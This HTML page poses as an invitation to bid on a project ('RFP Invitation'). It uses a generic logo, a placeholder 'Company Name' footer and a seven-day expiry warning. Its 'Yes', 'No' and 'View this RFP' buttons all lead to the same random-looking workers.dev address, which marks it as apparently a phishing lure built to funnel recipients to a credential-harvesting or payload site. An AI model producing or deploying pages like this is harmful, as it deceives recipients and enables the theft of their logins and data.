<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>RFP Invitation</title>
  <meta name="description" content="You are invited to bid on our upcoming project." />
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #f9fafc;
      color: #1e293b;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      padding: 20px;
    }
    .logo {
      width: 140px;
      height: auto;
      margin-bottom: 24px;
    }
    .message {
      font-size: 1.1rem;
      margin-bottom: 10px;
      color: #334155;
    }
    .expires {
      font-size: 0.95rem;
      color: #ef4444;
      margin-bottom: 30px;
    }
    .buttons {
      display: flex;
      justify-content: center;
      gap: 20px;
      flex-wrap: wrap;
      margin-bottom: 30px;
    }
    .btn {
      padding: 14px 24px;
      border-radius: 10px;
      font-weight: 600;
      text-decoration: none;
      color: white;
      transition: background-color 0.25s, transform 0.2s;
      display: inline-block;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
    }
    .btn:hover {
      transform: translateY(-2px);
    }
    .btn.yes {
      background-color: #22c55e;
    }
    .btn.yes:hover {
      background-color: #16a34a;
    }
    .btn.no {
      background-color: #ef4444;
    }
    .btn.no:hover {
      background-color: #dc2626;
    }
    .cta {
      background-color: #2563eb;
      color: white;
      padding: 16px 36px;
      border-radius: 12px;
      font-weight: 700;
      text-decoration: none;
      transition: background-color 0.25s, transform 0.2s;
      display: inline-block;
      box-shadow: 0 8px 24px rgba(37, 99, 235, 0.25);
      margin-bottom: 40px;
    }
    .cta:hover {
      background-color: #1d4ed8;
      transform: translateY(-2px);
      box-shadow: 0 12px 28px rgba(29, 78, 216, 0.3);
    }
    footer {
      font-size: 0.8rem;
      color: #94a3b8;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <img src="https://cdn-icons-png.flaticon.com/512/2991/2991112.png" alt="Document Suite Logo" class="logo" />
  
  <div class="message">You are invited to bid on our upcoming project.</div>
  <div class="expires">This document expires in 7 days.</div>
  
  <div class="buttons">
    <a href="https://ddtjrvoc.xosotisuqe.workers.dev/sOCymMeU" target="_blank" rel="noopener" class="btn yes">Click Yes to Bid</a>
    <a href="https://ddtjrvoc.xosotisuqe.workers.dev/sOCymMeU" target="_blank" rel="noopener" class="btn no">Click No if Not Bidding</a>
  </div>
  
  <a href="https://ddtjrvoc.xosotisuqe.workers.dev/sOCymMeU" target="_blank" rel="noopener" class="cta">VIEW THIS RFP</a>

  <footer>Â© 2025 Company Name. All rights reserved.</footer>
</body>
</html>
